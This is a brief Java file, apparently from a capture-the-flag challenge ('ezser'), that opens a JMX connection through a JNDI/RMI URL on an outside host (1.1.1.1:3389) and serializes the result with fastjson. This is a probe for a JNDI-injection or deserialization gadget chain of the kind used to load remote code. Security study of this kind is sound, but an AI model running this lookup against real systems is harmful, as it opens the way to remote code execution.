package com.ctf.ezser;

import com.alibaba.fastjson.JSON;

import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.io.IOException;
import java.net.MalformedURLException;

/**
 * @program: ezser
 * @author: LFY
 * @create: 2023-01-04 12:38
 **/
public class fjtest {

    public static void main(String[] args) throws IOException {
        JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://1.1.1.1:3389/jmxrmi");
        System.out.println("URL: " + u + ", connecting");
        JMXConnector c = JMXConnectorFactory.connect(u);
        System.out.println(JSON.toJSON(c));
    }
}
